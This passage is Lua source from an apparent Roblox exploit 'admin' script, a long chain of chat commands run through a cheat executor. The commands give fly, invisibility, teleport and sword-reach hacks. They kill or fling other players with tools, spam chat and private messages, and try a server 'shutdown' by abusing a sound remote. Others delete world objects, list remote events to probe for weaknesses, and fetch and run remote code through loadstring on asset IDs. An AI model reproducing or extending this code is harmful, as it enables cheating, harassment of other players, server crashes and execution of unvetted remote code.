	if string.sub(msg, 1, 10) == (prefix.."loopdhats") then
		droppinghats = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Loop Drop Enabled";
		Text = "Type ;unloopdhats to disable";
		})
	end
	if string.sub(msg, 1, 12) == (prefix.."unloopdhats") then
		droppinghats = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Loop Drop Disabled";
		Text = "Type ;loopdhats to enable.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."loopdtool") then
		droppingtools = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Loop Drop Enabled";
		Text = "Type ;unloopdtool to disable";
		})
	end
	if string.sub(msg, 1, 12) == (prefix.."unloopdtool") then
		droppingtools = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Loop Drop Disabled";
		Text = "Type ;loopdtool to enable.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."invisible") then -- Credit to Timeless
		Local = game:GetService('Players').LocalPlayer
		Char  = Local.Character
		touched,tpdback = false, false
		box = Instance.new('Part',workspace)
		box.Anchored = true
		box.CanCollide = true
		box.Size = Vector3.new(10,1,10)
		box.Position = Vector3.new(0,10000,0)
		box.Touched:connect(function(part)
		    if (part.Parent.Name == Local.Name) then
		        if touched == false then
		            touched = true
		            function apply()
		                if script.Disabled ~= true then
		                    no = Char.HumanoidRootPart:Clone()
		                    wait(.25)
		                    Char.HumanoidRootPart:Destroy()
		                    no.Parent = Char
		                    Char:MoveTo(loc)
		                    touched = false
		                end end
		            if Char then
		                apply()
		            end
		        end
		    end
		end)
		repeat wait() until Char
		loc = Char.HumanoidRootPart.Position
		Char:MoveTo(box.Position + Vector3.new(0,.5,0))
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Invisibility enabled!";
		Text = "Reset or use ;respawn to remove.";
		})
	end
	if string.sub(msg, 1, 6) == (prefix.."view ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
			if game:GetService("Players")[v.Name].Character.Humanoid then
				game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
			else
				game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
			end
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."unview") then
		if lplayer.Character.Humanoid then
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
		else
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
		end
	end
	if string.sub(msg, 1, 6) == (prefix.."goto ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
		end
	end
	if string.sub(msg, 1, 4) == (prefix.."fly") then
	repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
	repeat wait() until Mouse
	
	local T = lplayer.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = speedget
	
	local function fly()
		flying = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
		repeat wait()
		lplayer.Character.Humanoid.PlatformStand = true
		if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
		SPEED = 50
		elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
		SPEED = 0
		end
		if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
		elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		else
		BV.velocity = Vector3.new(0, 0.1, 0)
		end
		BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not flying
				CONTROL = {F = 0, B = 0, L = 0, R = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0}
				SPEED = 0
				BG:destroy()
				BV:destroy()
				lplayer.Character.Humanoid.PlatformStand = false
			end)
		end
	Mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = speedfly
		elseif KEY:lower() == 's' then
			CONTROL.B = -speedfly
		elseif KEY:lower() == 'a' then
			CONTROL.L = -speedfly 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = speedfly
		end
	end)
	Mouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	fly()
	end
	if string.sub(msg, 1, 6) == (prefix.."unfly") then
		flying = false
		lplayer.Character.Humanoid.PlatformStand = false
	end
	if string.sub(msg, 1, 6) == (prefix.."chat ") then
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(msg, 7)), "All")
	end
	if string.sub(msg, 1, 6) == (prefix.."spam ") then
		spamtext = (string.sub(msg, 7))
		spamming = true
	end
	if string.sub(msg, 1, 7) == (prefix.."unspam") then
		spamming = false
	end
	if string.sub(msg, 1, 10) == (prefix.."spamwait ") then
		spamdelay = (string.sub(msg, 11))
	end
	if string.sub(msg, 1, 8) == (prefix.."pmspam ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
			pmspammed = v.Name
			spammingpm = true
		end
	end
	if string.sub(msg, 1, 9) == (prefix.."unpmspam") then
		spammingpm = false
	end
	if string.sub(msg, 1, 9) == (prefix.."cfreeze ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 10))) do
			v.Character["Left Leg"].Anchored = true
			v.Character["Left Arm"].Anchored = true
			v.Character["Right Leg"].Anchored = true
			v.Character["Right Arm"].Anchored = true
			v.Character.Torso.Anchored = true
			v.Character.Head.Anchored = true
		end
	end
	if string.sub(msg, 1, 11) == (prefix.."uncfreeze ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 12))) do
			v.Character["Left Leg"].Anchored = false
			v.Character["Left Arm"].Anchored = false
			v.Character["Right Leg"].Anchored = false
			v.Character["Right Arm"].Anchored = false
			v.Character.Torso.Anchored = false
			v.Character.Head.Anchored = false
		end
	end
	if string.sub(msg, 1, 9) == (prefix.."unlockws") then
		local a = game:GetService("Workspace"):getChildren()
		for i = 1, #a do
			if a[i].className == "Part" then
				a[i].Locked = false
			elseif a[i].className == "Model" then
				local r = a[i]:getChildren()
				for i = 1, #r do
					if r[i].className == "Part" then
					r[i].Locked = false
					end
				end
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Success!";
		Text = "Workspace unlocked. Use ;lockws to lock.";
		})
	end
	if string.sub(msg, 1, 7) == (prefix.."lockws") then
		local a = game:GetService("Workspace"):getChildren()
		for i = 1, #a do
			if a[i].className == "Part" then
				a[i].Locked = true
			elseif a[i].className == "Model" then
				local r = a[i]:getChildren()
				for i = 1, #r do
					if r[i].className == "Part" then
					r[i].Locked = true
					end
				end
			end
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."btools") then
		local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
		Clone_T.BinType = "Clone"
		local Destruct = Instance.new("HopperBin",lplayer.Backpack)
		Destruct.BinType = "Hammer"
		local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
		Hold_T.BinType = "Grab"
	end
	if string.sub(msg, 1, 7) == (prefix.."pstand") then
		lplayer.Character.Humanoid.PlatformStand = true
	end
	if string.sub(msg, 1, 9) == (prefix.."unpstand") then
		lplayer.Character.Humanoid.PlatformStand = false
	end
	if string.sub(msg, 1, 10) == (prefix.."blockhead") then
		lplayer.Character.Head.Mesh:Destroy()
	end
	if string.sub(msg, 1, 4) == (prefix.."sit") then
		lplayer.Character.Humanoid.Sit = true
	end
	if string.sub(msg, 1, 10) == (prefix.."bringobj ") then
		local function bringobjw()
		for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
		if obj.Name == (string.sub(msg, 11)) then
		obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
		obj.CanCollide = false
		obj.Transparency = 0.7
		wait()
		obj.CFrame = lplayer.Character["Left Leg"].CFrame
		wait()
		obj.CFrame = lplayer.Character["Right Leg"].CFrame
		wait()
		obj.CFrame = lplayer.Character["Head"].CFrame
		end
		end
		end
		while wait() do
			bringobjw()
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "BringObj";
		Text = "BringObj enabled.";
		})
	end
	if string.sub(msg, 1, 7) == (prefix.."wsvis ") then
		vis = (string.sub(msg, 8))
		local a = game:GetService("Workspace"):GetDescendants()
		for i = 1, #a do
			if a[i].className == "Part" then
				a[i].Transparency = vis
			elseif a[i].className == "Model" then
				local r = a[i]:getChildren()
				for i = 1, #r do
					if r[i].className == "Part" then
					r[i].Transparency = vis
					end
				end
			end
		end
	end
	if string.sub(msg, 1, 11) == (prefix.."hypertotal") then
		loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Success!";
		Text = "HyperTotal GUI Loaded!";
		})
	end
	if string.sub(msg, 1, 5) == (prefix.."cmds") then
		CMDSFRAME.Visible = true
	end
	if string.sub(msg, 1, 10) == (prefix.."rmeshhats") then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Accessory")) or (v:IsA("Hat")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
	if string.sub(msg, 1, 10) == (prefix.."blockhats") then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Accessory")) or (v:IsA("Hat")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
	if string.sub(msg, 1, 10) == (prefix.."rmeshtool") then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Tool")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
	if string.sub(msg, 1, 10) == (prefix.."blocktool") then
		for i,v in pairs(lplayer.Character:GetChildren()) do
			if (v:IsA("Tool")) then
				v.Handle.Mesh:Destroy()
			end
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."spinner") then
		local p = Instance.new("RocketPropulsion")
		p.Parent = lplayer.Character.HumanoidRootPart
		p.Name = "Spinner"
		p.Target = lplayer.Character["Left Arm"]
		p:Fire()
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Spinner enabled";
		Text = "Type ;nospinner to disable.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."nospinner") then
		lplayer.Character.HumanoidRootPart.Spinner:Destroy()
	end
	if string.sub(msg, 1, 7) == (prefix.."reachd") then
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
			if v:isA("Tool") then
				local a = Instance.new("SelectionBox",v.Handle)
				a.Adornee = v.Handle
				v.Handle.Size = Vector3.new(0.5,0.5,60)
				v.GripPos = Vector3.new(0,0,0)
				lplayer.Character.Humanoid:UnequipTools()
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Reach applied!";
		Text = "Applied to equipped sword. Use ;noreach to disable.";
		})
	end
	if string.sub(msg, 1, 7) == (prefix.."reach ") then
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
			if v:isA("Tool") then
				handleSize = v.Handle.Size
				wait()
				local a = Instance.new("SelectionBox",v.Handle)
				a.Name = "a"
				a.Adornee = v.Handle
				v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(msg, 8)))
				v.GripPos = Vector3.new(0,0,0)
				lplayer.Character.Humanoid:UnequipTools()
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Reach applied!";
		Text = "Applied to equipped sword. Use ;noreach to disable.";
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."noreach") then
		for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
			if v:isA("Tool") then
				v.Handle.a:Destroy()
				v.Handle.Size = handleSize
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Reach removed!";
		Text = "Removed reach from equipped sword.";
		})
	end
	if string.sub(msg, 1, 7) == (prefix.."rkill ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			wait(0.1)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.2)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.5)
			lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."tp me ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."cbring ") then
		if (string.sub(msg, 9)) == "all" or (string.sub(msg, 9)) == "All" or (string.sub(msg, 9)) == "ALL" then
			cbringall = true
		else
			for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
				brplr = v.Name
			end
		end
		cbring = true
	end
	if string.sub(msg, 1, 9) == (prefix.."uncbring") then
		cbring = false
		cbringall = false
	end
	if string.sub(msg, 1, 6) == (prefix.."swap ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
			local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			local NOW = lplayer.Character.HumanoidRootPart.CFrame
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			local function tp(player,player2)
			local char1,char2=player.Character,player2.Character
			if char1 and char2 then
			char1:MoveTo(char2.Head.Position)
			end
			end
			wait(0.1)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.2)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			wait(0.5)
			lplayer.Character.HumanoidRootPart.CFrame = NOW
			wait(0.6)
			tp(lplayer, game:GetService("Players")[v.Name])
			wait(0.4)
			lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."glitch ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
			lplayer.Character.Humanoid.Name = 1
			local l = lplayer.Character["1"]:Clone()
			l.Parent = lplayer.Character
			l.Name = "Humanoid"
			wait(0.1)
			lplayer.Character["1"]:Destroy()
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
			lplayer.Character.Animate.Disabled = true
			wait(0.1)
			lplayer.Character.Animate.Disabled = false
			lplayer.Character.Humanoid.DisplayDistanceType = "None"
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
			lplayer.Character.Humanoid:EquipTool(v)
			end
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
			wait(0.3)
			lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
			wait(0.4)
			b = Instance.new("BodyForce")
			b.Parent = lplayer.Character.HumanoidRootPart
			b.Name = "Glitch"
			b.Force = Vector3.new(100000000,5000,0)
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools needed!";
			Text = "You need a tool in your backpack for this command!";
			})
		end
	end
	if string.sub(msg, 1, 9) == (prefix.."unglitch") then
		lplayer.Character.HumanoidRootPart.Glitch:Destroy()
		lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
		b = Instance.new("BodyForce")
		b.Parent = lplayer.Character.HumanoidRootPart
		b.Name = "unGlitch"
		b.Force = Vector3.new(0,-5000000,0)
		wait(2)
		lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
	end
	if string.sub(msg, 1, 9) == (prefix.."grespawn") then
		lplayer.Character.Humanoid.Health = 0
		wait(1)
		lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
		lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
	end
	if string.sub(msg, 1, 9) == (prefix.."explorer") then
		loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Success!";
		Text = "DEX Explorer has loaded.";
		})
	end
	if string.sub(msg, 1, 6) == (prefix.."anim ") then
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..(string.sub(msg, 7))
		local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
		track:Play(.1, 1, 1)
	end
	if string.sub(msg, 1, 8) == (prefix.."animgui") then
		loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Success!";
		Text = "Energize Animations GUI has loaded.";
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."savepos") then
		saved = lplayer.Character.HumanoidRootPart.CFrame
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Position Saved";
		Text = "Use ;loadpos to return to saved position.";
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."loadpos") then
		lplayer.Character.HumanoidRootPart.CFrame = saved
	end
	if string.sub(msg, 1, 6) == (prefix.."bang ") then
		for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
			local Anim2 = Instance.new("Animation")
			Anim2.AnimationId = "rbxassetid://148840371"
			local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
			track2:Play(.1, 1, 1)
			bplrr = v.Name
			banpl = true
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."unbang") then
		banpl = false
	end
	if string.sub(msg, 1, 10) == (prefix.."bringmod ") then
		local function bringmodw()
		for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
		if obj.Name == (string.sub(msg, 11)) then
		for i,ch in pairs(obj:GetDescendants()) do
		if (ch:IsA("BasePart")) then
		ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
		ch.CanCollide = false
		ch.Transparency = 0.7
		wait()
		ch.CFrame = lplayer.Character["Left Leg"].CFrame
		wait()
		ch.CFrame = lplayer.Character["Right Leg"].CFrame
		wait()
		ch.CFrame = lplayer.Character["Head"].CFrame
		end
		end
		end
		end
		end
		while wait() do
			bringmodw()
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "BringMod";
		Text = "BringMod enabled.";
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."respawn") then
		local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
		local hum = Instance.new('Humanoid', mod)
		local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
		lplayer.Character = mod
	end
	if string.sub(msg, 1, 9) == (prefix.."shutdown") then
		game:GetService'RunService'.Stepped:Connect(function()
		pcall(function()
		    for i,v in pairs(game:GetService'Players':GetPlayers()) do
		        if v.Character ~= nil and v.Character:FindFirstChild'Head' then
		            for _,x in pairs(v.Character.Head:GetChildren()) do
		                if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
		            end
		        end
		    end
		end)
		end)
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Attempting Shutdown";
		Text = "Shutdown Attempt has begun.";
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."delobj ") then
		objtodel = (string.sub(msg, 9))
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			if v.Name == objtodel then
				v:Destroy()
			end
		end
	end
	if string.sub(msg, 1, 8) == (prefix.."getplrs") then
		for i,v in pairs(game:GetService("Players"):GetPlayers())do
			print(v)
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Printed";
		Text = "Players have been printed to console. (F9)";
		})
	end
	if string.sub(msg, 1, 9) == (prefix.."deldecal") then
		for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
			if (v:IsA("Decal")) then
				v:Destroy()
			end
		end
	end
	if string.sub(msg, 1, 11) == (prefix.."opfinality") then
		loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Success!";
		Text = "OpFinality GUI has loaded.";
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."remotes") then
		remotes = true
		added = true
		game.DescendantAdded:connect(function(rmt)
		if added == true then
		if remotes == true then 
		if rmt:IsA("RemoteEvent") then
		print("A RemoteEvent was added!")
		print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
		print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
		end end end
		end)
		game.DescendantAdded:connect(function(rmtfnctn)
		if added == true then
		if remotes == true then 
		if rmtfnctn:IsA("RemoteFunction") then
		warn("A RemoteFunction was added!")
		warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
		print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
		end end end
		end)
		
		game.DescendantAdded:connect(function(bndfnctn)
		if added == true then
		if binds == true then 
		if bndfnctn:IsA("BindableFunction") then
		print("A BindableFunction was added!")
		print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
		print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
		end end end
		end)
		
		game.DescendantAdded:connect(function(bnd)
		if added == true then
		if binds == true then 
		if bnd:IsA("BindableEvent") then
		warn("A BindableEvent was added!")
		warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
		print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
		end end end
		end)
		
		
		if binds == true then
		for i,v in pairs(game:GetDescendants()) do
		if v:IsA("BindableFunction") then
		print(" game." .. v:GetFullName() .. " | BindableFunction")
		print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
		end end
		for i,v in pairs(game:GetDescendants()) do
		if v:IsA("BindableEvent") then
		warn(" game." .. v:GetFullName() .. " | BindableEvent")
		print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
		end end
		else
		print("Off")
		end
		if remotes == true then
		for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteFunction") then
		warn(" game." .. v:GetFullName() .. " | RemoteFunction")
		print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
		end end
		wait()
		for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
		print(" game." .. v:GetFullName() .. " | RemoteEvent")
		print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
		end end
		else
		print("Off")
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Printing Remotes";
		Text = "Type ;noremotes to disable.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."noremotes") then
		remotes = false
		added = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Printing Remotes Disabled";
		Text = "Type ;remotes to enable.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."tpdefault") then
		spin = false
		followed = false
		traill = false
		noclip = false
		annoying = false
		hwalk = false
		cbringing = false
	end
	if string.sub(msg, 1, 8) == (prefix.."stopsit") then
		stopsitting = true
	end
	if string.sub(msg, 1, 6) == (prefix.."gosit") then
		stopsitting = false
	end
	if string.sub(msg, 1, 8) == (prefix.."version") then
		print(adminversion)
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Version";
		Text = adminversion;
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."clicktp") then
		clickgoto = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Click TP";
		Text = "Press E to teleport to mouse position, ;noclicktp to stop";
		})
	end
	if string.sub(msg, 1, 9) == (prefix.."clickdel") then
		clickdel = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Click Delete";
		Text = "Press E to delete part at mouse, ;noclickdel to stop";
		})
	end
	if string.sub(msg, 1, 11) == (prefix.."noclickdel") then
		clickdel = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Click Delete";
		Text = "Click delete has been disabled.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."noclicktp") then
		clickgoto = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Click TP";
		Text = "Click TP has been disabled.";
		})
	end
	if string.sub(msg, 1, 8) == (prefix.."toolson") then
		gettingtools = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Tools Enabled";
		Text = "Automatically colleting tools dropped.";
		})
	end
	if string.sub(msg, 1, 9) == (prefix.."toolsoff") then
		gettingtools = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Tools Disabled";
		Text = "Click TP has been disabled.";
		})
	end
	if string.sub(msg, 1, 10) == (prefix.."delcmdbar") then
		ScreenGui:Destroy()
	end
	if string.sub(msg, 1, 6) == (prefix.."reset") then
		lplayer.Character.Head:Destroy()
	end
	if string.sub(msg, 1, 7) == (prefix.."state ") then
		statechosen = string.sub(msg, 8)
		changingstate = true
	end
	if string.sub(msg, 1, 9) == (prefix.."gravity ") then
		game:GetService("Workspace").Gravity = string.sub(msg, 10)
	end
	if string.sub(msg, 1, 10) == (prefix.."looprhats") then
		removingmeshhats = true
	end
	if string.sub(msg, 1, 12) == (prefix.."unlooprhats") then
		removingmeshhats = false
	end
	if string.sub(msg, 1, 10) == (prefix.."looprtool") then
		removingmeshtool = true
	end
	if string.sub(msg, 1, 12) == (prefix.."unlooprtool") then
		removingmeshtool = false
	end
	if string.sub(msg, 1, 10) == (prefix.."givetool ") then
		for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
			if v:IsA("Tool") then
				for i,player in pairs(GetPlayer(string.sub(msg, 11))) do
					v.Parent = player.Character
				end
			end
		end
	end
	if string.sub(msg, 1, 14) == (prefix.."givealltools ") then
		for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = lplayer.Character
				wait()
				for i,player in pairs(GetPlayer(string.sub(msg, 15))) do
					v.Parent = player.Character
				end
			end
		end
	end
	if string.sub(msg, 1, 5) == (prefix.."age ") then
		for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
		end
	end
	if string.sub(msg, 1, 4) == (prefix.."id ") then
		for i,player in pairs(GetPlayer(string.sub(msg, 5))) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
		end
	end
	if string.sub(msg, 1, 6) == (prefix..".age ") then
		for i,player in pairs(GetPlayer(string.sub(msg, 7))) do
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = player.AccountAge.." Days";
			Text = "Account age of "..player.Name;
			})
		end
	end
	if string.sub(msg, 1, 5) == (prefix..".id ") then
		for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = player.UserId.." ID";
			Text = "Account ID of "..player.Name;
			})
		end
	end
	if string.sub(msg, 1, 7) == (prefix.."gameid") then
		game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Game ID";
